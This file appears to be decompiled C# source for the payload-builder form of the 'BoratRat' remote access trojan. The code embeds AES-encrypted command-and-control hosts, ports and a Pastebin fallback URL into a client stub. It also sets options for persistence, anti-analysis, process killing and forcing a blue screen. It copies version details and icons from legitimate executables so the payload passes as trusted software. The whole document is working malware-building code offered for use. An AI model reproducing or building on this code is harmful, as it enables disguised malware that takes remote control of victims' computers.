using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.Algorithm;
using Server.Helper;
using Server.Properties;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace Server.Forms
{
	// Token: 0x02000059 RID: 89
	public partial class FormBuilder : DarkForm
	{
		// Token: 0x06000354 RID: 852 RVA: 0x0001C6D4 File Offset: 0x0001C6D4
		public FormBuilder()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000355 RID: 853 RVA: 0x0001C6F0 File Offset: 0x0001C6F0
		private void SaveSettings()
		{
			try
			{
				List<string> list = new List<string>();
				foreach (object obj in this.listBoxPort.Items)
				{
					string item = (string)obj;
					list.Add(item);
				}
				Settings.Default.Ports = string.Join(",", list);
				List<string> list2 = new List<string>();
				foreach (object obj2 in this.listBoxIP.Items)
				{
					string item2 = (string)obj2;
					list2.Add(item2);
				}
				Settings.Default.IP = string.Join(",", list2);
				Settings.Default.Save();
			}
			catch
			{
			}
		}

		// Token: 0x06000356 RID: 854 RVA: 0x0001C80C File Offset: 0x0001C80C
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				this.checkBox1.Text = "ON";
				this.textFilename.Enabled = true;
				this.comboBoxFolder.Enabled = true;
				return;
			}
			this.checkBox1.Text = "OFF";
			this.textFilename.Enabled = false;
			this.comboBoxFolder.Enabled = false;
		}

		// Token: 0x06000357 RID: 855 RVA: 0x0001C880 File Offset: 0x0001C880
		private void Builder_Load(object sender, EventArgs e)
		{
			this.comboBoxFolder.SelectedIndex = 0;
			if (Settings.Default.IP.Length == 0)
			{
				this.listBoxIP.Items.Add("127.0.0.1");
			}
			if (Settings.Default.Paste_bin.Length == 0)
			{
				this.txtPaste_bin.Text = "https://Pastebin.com/raw/fevFJe98";
			}
			try
			{
				foreach (string text in Settings.Default.Ports.Split(new string[]
				{
					","
				}, StringSplitOptions.None))
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						this.listBoxPort.Items.Add(text.Trim());
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (string text2 in Settings.Default.IP.Split(new string[]
				{
					","
				}, StringSplitOptions.None))
				{
					if (!string.IsNullOrWhiteSpace(text2))
					{
						this.listBoxIP.Items.Add(text2.Trim());
					}
				}
			}
			catch
			{
			}
			if (Settings.Default.Mutex.Length == 0)
			{
				this.txtMutex.Text = this.getRandomCharacters();
			}
		}

		// Token: 0x06000358 RID: 856 RVA: 0x0001C9F4 File Offset: 0x0001C9F4
		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkPaste_bin.Checked)
			{
				this.txtPaste_bin.Enabled = true;
				this.textIP.Enabled = false;
				this.textPort.Enabled = false;
				this.listBoxIP.Enabled = false;
				this.listBoxPort.Enabled = false;
				this.btnAddIP.Enabled = false;
				this.btnAddPort.Enabled = false;
				this.btnRemoveIP.Enabled = false;
				this.btnRemovePort.Enabled = false;
				return;
			}
			this.txtPaste_bin.Enabled = false;
			this.textIP.Enabled = true;
			this.textPort.Enabled = true;
			this.listBoxIP.Enabled = true;
			this.listBoxPort.Enabled = true;
			this.btnAddIP.Enabled = true;
			this.btnAddPort.Enabled = true;
			this.btnRemoveIP.Enabled = true;
			this.btnRemovePort.Enabled = true;
		}

		// Token: 0x06000359 RID: 857 RVA: 0x0001CAF0 File Offset: 0x0001CAF0
		private void BtnRemovePort_Click(object sender, EventArgs e)
		{
			if (this.listBoxPort.SelectedItems.Count == 1)
			{
				this.listBoxPort.Items.Remove(this.listBoxPort.SelectedItem);
			}
		}

		// Token: 0x0600035A RID: 858 RVA: 0x0001CB34 File Offset: 0x0001CB34
		private void BtnAddPort_Click(object sender, EventArgs e)
		{
			try
			{
				Convert.ToInt32(this.textPort.Text.Trim());
				using (IEnumerator enumerator = this.listBoxPort.Items.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						if (((string)enumerator.Current).Equals(this.textPort.Text.Trim()))
						{
							return;
						}
					}
				}
				this.listBoxPort.Items.Add(this.textPort.Text.Trim());
				this.textPort.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x0600035B RID: 859 RVA: 0x0001CC0C File Offset: 0x0001CC0C
		private void BtnRemoveIP_Click(object sender, EventArgs e)
		{
			if (this.listBoxIP.SelectedItems.Count == 1)
			{
				this.listBoxIP.Items.Remove(this.listBoxIP.SelectedItem);
			}
		}

		// Token: 0x0600035C RID: 860 RVA: 0x0001CC50 File Offset: 0x0001CC50
		private void BtnAddIP_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.listBoxIP.Items)
				{
					string text = (string)obj;
					this.textIP.Text = this.textIP.Text.Replace(" ", "");
					if (text.Equals(this.textIP.Text))
					{
						return;
					}
				}
				this.listBoxIP.Items.Add(this.textIP.Text.Replace(" ", ""));
				this.textIP.Clear();
			}
			catch
			{
			}
		}

		// Token: 0x0600035D RID: 861 RVA: 0x0001CD3C File Offset: 0x0001CD3C
		private void BtnBuild_Click(object sender, EventArgs e)
		{
			FormBuilder.<BtnBuild_Click>d__9 <BtnBuild_Click>d__;
			<BtnBuild_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<BtnBuild_Click>d__.<>4__this = this;
			<BtnBuild_Click>d__.<>1__state = -1;
			<BtnBuild_Click>d__.<>t__builder.Start<FormBuilder.<BtnBuild_Click>d__9>(ref <BtnBuild_Click>d__);
		}

		// Token: 0x0600035E RID: 862 RVA: 0x0001CD78 File Offset: 0x0001CD78
		private void WriteAssembly(string filename)
		{
			try
			{
				VersionResource versionResource = new VersionResource();
				versionResource.LoadFrom(filename);
				versionResource.FileVersion = this.txtFileVersion.Text;
				versionResource.ProductVersion = this.txtProductVersion.Text;
				versionResource.Language = 0;
				StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
				stringFileInfo["ProductName"] = this.txtProduct.Text;
				stringFileInfo["FileDescription"] = this.txtDescription.Text;
				stringFileInfo["CompanyName"] = this.txtCompany.Text;
				stringFileInfo["LegalCopyright"] = this.txtCopyright.Text;
				stringFileInfo["LegalTrademarks"] = this.txtTrademarks.Text;
				stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
				stringFileInfo["InternalName"] = this.txtOriginalFilename.Text;
				stringFileInfo["OriginalFilename"] = this.txtOriginalFilename.Text;
				stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
				stringFileInfo["FileVersion"] = versionResource.FileVersion;
				versionResource.SaveTo(filename);
			}
			catch (Exception ex)
			{
				throw new ArgumentException("Assembly: " + ex.Message);
			}
		}

		// Token: 0x0600035F RID: 863 RVA: 0x0001CED8 File Offset: 0x0001CED8
		private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
		{
			if (this.btnAssembly.Checked)
			{
				this.btnClone.Enabled = true;
				this.txtProduct.Enabled = true;
				this.txtDescription.Enabled = true;
				this.txtCompany.Enabled = true;
				this.txtCopyright.Enabled = true;
				this.txtTrademarks.Enabled = true;
				this.txtOriginalFilename.Enabled = true;
				this.txtOriginalFilename.Enabled = true;
				this.txtProductVersion.Enabled = true;
				this.txtFileVersion.Enabled = true;
				return;
			}
			this.btnClone.Enabled = false;
			this.txtProduct.Enabled = false;
			this.txtDescription.Enabled = false;
			this.txtCompany.Enabled = false;
			this.txtCopyright.Enabled = false;
			this.txtTrademarks.Enabled = false;
			this.txtOriginalFilename.Enabled = false;
			this.txtOriginalFilename.Enabled = false;
			this.txtProductVersion.Enabled = false;
			this.txtFileVersion.Enabled = false;
		}

		// Token: 0x06000360 RID: 864 RVA: 0x0001CFEC File Offset: 0x0001CFEC
		private void ChkIcon_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkIcon.Checked)
			{
				this.txtIcon.Enabled = true;
				this.btnIcon.Enabled = true;
				return;
			}
			this.txtIcon.Enabled = false;
			this.btnIcon.Enabled = false;
		}

		// Token: 0x06000361 RID: 865 RVA: 0x0001D040 File Offset: 0x0001D040
		private void BtnIcon_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose Icon";
				openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
					{
						string icon = this.GetIcon(openFileDialog.FileName);
						this.txtIcon.Text = icon;
						this.picIcon.ImageLocation = icon;
					}
					else
					{
						this.txtIcon.Text = openFileDialog.FileName;
						this.picIcon.ImageLocation = openFileDialog.FileName;
					}
				}
			}
		}

		// Token: 0x06000362 RID: 866 RVA: 0x0001D104 File Offset: 0x0001D104
		private string GetIcon(string path)
		{
			try
			{
				string text = Path.GetTempFileName() + ".ico";
				using (FileStream fileStream = new FileStream(text, FileMode.Create))
				{
					IconExtractor.Extract1stIconTo(path, fileStream);
				}
				return text;
			}
			catch
			{
			}
			return "";
		}

		// Token: 0x06000363 RID: 867 RVA: 0x0001D174 File Offset: 0x0001D174
		private void WriteSettings(ModuleDefMD asmDef, string AsmName)
		{
			try
			{
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				X509Certificate2 x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
				X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
				byte[] inArray;
				using (RSACryptoServiceProvider rsacryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
				{
					byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
					inArray = rsacryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
				}
				foreach (TypeDef typeDef in asmDef.Types)
				{
					asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
					asmDef.Name = Path.GetFileName(AsmName);
					if (typeDef.Name == "Settings")
					{
						foreach (MethodDef methodDef in typeDef.Methods)
						{
							if (methodDef.Body != null)
							{
								for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
								{
									if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
									{
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Ports%")
										{
											if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
											else
											{
												List<string> list = new List<string>();
												foreach (object obj in this.listBoxPort.Items)
												{
													string item = (string)obj;
													list.Add(item);
												}
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Hosts%")
										{
											if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
											else
											{
												List<string> list2 = new List<string>();
												foreach (object obj2 in this.listBoxIP.Items)
												{
													string item2 = (string)obj2;
													list2.Add(item2);
												}
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Install%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox1.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Folder%")
										{
											methodDef.Body.Instructions[i].Operand = this.comboBoxFolder.Text;
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%File%")
										{
											methodDef.Body.Instructions[i].Operand = this.textFilename.Text;
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Version%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("BoratRat ", ""));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Key%")
										{
											methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%MTX%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtMutex.Text);
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Anti%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAnti.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkAntiProcess.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Certificate%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%BSOD%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.chkBsod.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
										{
											if (this.chkPaste_bin.Checked)
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtPaste_bin.Text);
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
											}
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Delay%")
										{
											methodDef.Body.Instructions[i].Operand = this.numDelay.Value.ToString();
										}
										if (methodDef.Body.Instructions[i].Operand.ToString() == "%Group%")
										{
											methodDef.Body.Instructions[i].Operand = aes.Encrypt(this.txtGroup.Text);
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

		// Token: 0x06000364 RID: 868 RVA: 0x0001DAB0 File Offset: 0x0001DAB0
		public string getRandomCharacters()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= new Random().Next(10, 20); i++)
			{
				int index = this.random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
				stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000365 RID: 869 RVA: 0x0001DB14 File Offset: 0x0001DB14
		private void BtnClone_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
					this.txtOriginalFilename.Text = (versionInfo.InternalName ?? string.Empty);
					this.txtDescription.Text = (versionInfo.FileDescription ?? string.Empty);
					this.txtCompany.Text = (versionInfo.CompanyName ?? string.Empty);
					this.txtProduct.Text = (versionInfo.ProductName ?? string.Empty);
					this.txtCopyright.Text = (versionInfo.LegalCopyright ?? string.Empty);
					this.txtTrademarks.Text = (versionInfo.LegalTrademarks ?? string.Empty);
					int fileMajorPart = versionInfo.FileMajorPart;
					this.txtFileVersion.Text = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
					this.txtProductVersion.Text = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
				}
			}
		}

		// Token: 0x040001EB RID: 491
		private readonly Random random = new Random();

		// Token: 0x040001EC RID: 492
		private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
	}
}
